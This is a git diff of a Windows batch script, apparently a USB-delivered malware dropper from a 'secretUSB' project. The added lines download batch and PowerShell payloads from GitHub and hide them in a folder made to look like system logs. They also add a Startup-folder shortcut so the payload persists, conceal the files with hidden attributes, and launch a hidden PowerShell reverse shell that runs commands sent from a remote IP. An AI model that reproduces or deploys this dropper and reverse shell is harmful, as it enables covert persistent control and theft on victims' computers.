@@ -83,12 +83,23 @@ REM powershell -command "start-bitstransfer https://direct-url-for-payload/xxx.e
 
 REM start  Winupdate.exe & cd %temp% & Disable-Tamper.cmd
 
-start cmd /C curl -O https://github.com/Goenae/secretUSB/raw/main/logs.bat
-start cmd /C curl -O https://github.com/Goenae/secretUSB/raw/main/logs.ps1
+curl -O https://github.com/Goenae/secretUSB/raw/main/logs.bat
+curl -O https://github.com/Goenae/secretUSB/raw/main/logs.ps1
 
-start cmd /C attrib +h logs.bat
-start cmd /C attrib +h logs.ps1
+mkdir %USERPROFILE%\AppData\Roaming\System_logs
+
+move logs.bat %USERPROFILE%\AppData\Roaming\System_logs
+move logs.ps1 %USERPROFILE%\AppData\Roaming\System_logs
+
+cd %USERPROFILE%\AppData\Roaming\System_logs
+
+powershell.exe -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\%~logs.lnk');$s.TargetPath='%~logs.bat';$s.Save()"
+
+attrib +h %USERPROFILE%\AppData\Roaming\System_logs
+attrib +h %USERPROFILE%\AppData\Roaming\System_logs\logs.bat
+attrib +h %USERPROFILE%\AppData\Roaming\System_logs\logs.ps1
+attrib +h %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\logs.lnk
 
 
 
-powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('192.168.79.28', 4242);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('192.168.79.128', 4242);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
